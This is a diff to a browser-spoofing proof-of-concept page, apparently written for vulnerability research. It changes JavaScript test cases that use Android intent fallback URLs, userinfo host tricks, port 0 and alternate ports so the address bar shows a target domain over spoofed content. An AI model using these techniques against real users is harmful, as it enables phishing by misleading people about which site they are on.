@@ -23,9 +23,9 @@
 
   <button id="a" type="button">A - intent-fallback then replace(target:port) [original]</button>
   <button id="b" type="button">B - fallback_url = target:port directly (single-step)</button>
-  <button id="c" type="button">C - continuous race to target:port/?r=N</button>
-  <button id="d" type="button">D - userinfo https://target@hanghost:port</button>
-  <button id="e" type="button">E - intent-fallback then replace(target/generate_204)</button>
+  <button id="c" type="button">C - intent fallback = userinfo target@hanghost:port</button>
+  <button id="d" type="button">D - intent fallback = target:0 (port zero)</button>
+  <button id="e" type="button">E - intent fallback = target:8443 (alt filtered port)</button>
   <pre id="log"></pre>
 
 <script>
@@ -62,26 +62,24 @@
     });
 
     document.getElementById('c').addEventListener('click', function () {
-      log('C: intent then continuous race to ' + hang() + '?r=N');
-      location.href = intent('https://www.google.com/csi');
+      var u = 'https://' + host() + '@' + V('hanghost', 'example.com') + ':' + port() + '/';
+      log('C: intent fallback = userinfo ' + u);
       mark('C');
-      var n = 0;
-      var iv = setInterval(function () { try { location.replace(hang() + '?r=' + (++n)); } catch (e) {} }, 60);
-      setTimeout(function () { clearInterval(iv); log('C race stopped (15s)'); }, 15000);
+      location.href = intent(u);
     });
 
     document.getElementById('d').addEventListener('click', function () {
-      var u = 'https://' + host() + '@' + V('hanghost', 'example.com') + ':' + port() + '/';
-      log('D: userinfo ' + u);
+      var u = 'https://' + host() + ':0/';
+      log('D: intent fallback = ' + u + ' (port 0)');
       mark('D');
-      setTimeout(function () { try { location.replace(u); } catch (e) { log('err ' + e); } }, 300);
+      location.href = intent(u);
     });
 
     document.getElementById('e').addEventListener('click', function () {
-      log('E: intent-fallback then replace target/generate_204');
-      location.href = intent('https://www.google.com/csi');
+      var u = 'https://' + host() + ':8443/';
+      log('E: intent fallback = ' + u + ' (alt filtered port)');
       mark('E');
-      setTimeout(function () { try { location.replace(target().replace(/\/$/, '') + '/generate_204'); } catch (e) { log('err ' + e); } }, 1000);
+      location.href = intent(u);
     });
 
     log('ready - tap A..E, watch the omnibox vs the BENIGN SPOOF content');
